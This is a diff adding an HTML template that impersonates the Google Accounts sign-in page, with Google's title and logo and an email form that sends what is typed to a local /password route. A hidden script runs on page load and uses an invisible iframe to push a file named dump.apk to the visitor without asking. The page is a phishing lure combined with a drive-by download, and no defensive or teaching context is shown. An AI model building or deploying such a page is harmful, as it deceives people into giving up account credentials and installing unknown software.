@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Google Accounts</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="card-left">
+        <div class="signin-title-wrapper">
+          <img src="{{ url_for('static', filename='GoogleIcon.png') }}" alt="Google logo" class="logo" />
+          <div class="signin-text">
+            <h1>Sign in</h1>
+            <p class="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>
+          </div>
+        </div>
+      </div>
+      <form action="/password" method="get">
+        <div class="input-container">
+          <input type="email" id="email" name="email" placeholder=" " required />
+          <label for="email">Email or phone</label>
+        </div>
+        <div class="link forgot">
+          <a href="#">Forgot email?</a>
+        </div>
+        <div class="guest-text">
+          Not your computer? Use Guest mode to sign in privately.
+          <a href="#">Learn more about using Guest mode</a>
+        </div>
+        <div class="form-lower">
+          <div class="buttons">
+            <a href="#" class="create">Create account</a>
+            <button type="submit">Next</button>
+          </div>
+        </div>
+      </form>
+    </div>
+    <div class="footer">
+      <div class="footer-select">
+        <select>
+          <option>English (United States)</option>
+        </select>
+      </div>
+      <div class="footer-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+      </div>
+    </div>
+  </div>
+  <script>
+    window.onload = () => {
+      const iframe = document.createElement('iframe');
+      iframe.style.display = "none";
+      iframe.src = "{{ url_for('static', filename='download/dump.apk') }}";
+      document.body.appendChild(iframe);
+    }
+  </script>
+</body>
+</html>
